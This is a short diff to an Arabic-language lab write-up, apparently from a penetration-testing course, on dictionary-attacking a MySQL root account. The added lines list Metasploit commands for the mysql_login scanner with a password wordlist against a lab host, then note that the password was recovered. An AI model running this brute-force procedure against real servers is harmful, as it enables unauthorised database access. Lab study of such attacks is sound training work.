@@ -21,7 +21,17 @@ MySQL Recon: Dictionary Attack
 
 راح اكتب الاوامر مباشره بدون شرح هالمره في هذا اللاب لان استعملناه من قبل
 
+مطلوب مننا نجيب الباسورد حق يوزر الروت راح نسوي بروت فورس عن طريق MSFconsole
+[msfconsole]
+[use auxiliary/scanner/mysql/mysql_login]
+[set RHOSTS 192.149.194.3]
+[set USERNAME root]
+[set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt]
+[set VERBOSE false]
+[set STOP_ON_SUCCESS true]
+[exploit] or [run]
 
+نشوف انه عطانا الباسورد لاب خفيف جدا
 
 
 ---
